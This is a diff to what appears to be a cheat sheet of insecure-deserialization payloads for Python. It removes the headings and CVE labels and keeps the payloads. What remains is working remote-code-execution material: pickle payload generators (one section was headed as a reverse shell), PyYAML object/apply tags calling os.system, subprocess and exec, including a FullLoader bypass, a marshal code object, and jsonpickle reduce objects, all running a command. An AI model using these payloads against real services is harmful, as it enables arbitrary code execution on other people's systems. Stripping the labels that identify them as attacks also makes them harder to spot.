@@ -1,8 +1,3 @@
-# ============================================================
-# Insecure Deserialization — Python pickle / marshal / yaml
-# ============================================================
-
-# ---- Python pickle RCE Payload (Python code) ----
 import pickle, os, base64
 
 class Exploit(object):
@@ -12,7 +7,6 @@ class Exploit(object):
 payload = base64.b64encode(pickle.dumps(Exploit()))
 print(payload)
 
-# ---- Generic pickle RCE Template ----
 import pickle, base64
 
 class RCE:
@@ -22,7 +16,6 @@ class RCE:
 
 print(base64.b64encode(pickle.dumps(RCE())).decode())
 
-# ---- Pickle Reverse Shell ----
 import pickle, base64
 
 class Shell:
@@ -31,35 +24,24 @@ class Shell:
 
 print(base64.b64encode(pickle.dumps(Shell())).decode())
 
-# ---- pyyaml RCE (yaml.load without Loader) ----
-# CVE-2017-18342
 !!python/object/apply:os.system ["id"]
 !!python/object/apply:subprocess.check_output [["id"]]
 !!python/object/new:subprocess.Popen [["id"]]
 !!python/object/apply:os.popen ["id"]
 !!python/object/apply:exec ["import os; os.system('id')"]
 
-# ---- PyYAML FullLoader bypass (CVE-2020-1747) ----
 !!python/object/apply:subprocess.Popen
 args: [['id']]
 
-# ---- PyYAML RCE via FullLoader ----
 !!python/object/new:type
 args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
 listitems: "__import__('os').system('id')"
 
-# ---- marshal RCE ----
 import marshal, base64, types
 
 code = compile("import os; os.system('id')", "<string>", "exec")
 payload = base64.b64encode(marshal.dumps(code))
 
-# ---- jsonpickle RCE ----
 {"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}
 {"py/object/apply": "os.system", "args": ["id"]}
 {"py/object/new": "subprocess.Popen", "args": [["id"]]}
-
-# ---- shelve / pickle via web parameters ----
-# Look for: .pkl files, pickle GET parameters, session cookies with base64 data
-# Content-Type: application/x-pickle
-# Cookie: session=<base64-pickle>
